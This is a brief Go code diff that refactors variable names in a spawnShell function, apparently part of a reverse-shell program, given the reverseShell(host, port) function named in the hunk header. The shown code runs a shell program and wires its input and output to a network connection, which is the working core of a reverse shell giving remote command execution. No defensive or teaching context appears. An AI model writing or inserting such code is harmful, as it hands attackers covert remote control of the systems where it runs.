@@ -37,8 +37,8 @@ func reverseShell(host string, port int) {
 	}
 }
 
-func spawnShell(connexion net.Conn, shell string) {
-	cmd := exec.Command(shell)
-	cmd.Stdout, cmd.Stderr, cmd.Stdin = connexion, connexion, connexion
-	cmd.Run()
+func spawnShell(connexion net.Conn, shellProgram string) {
+	shell := exec.Command(shellProgram)
+	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
+	shell.Run()
 }
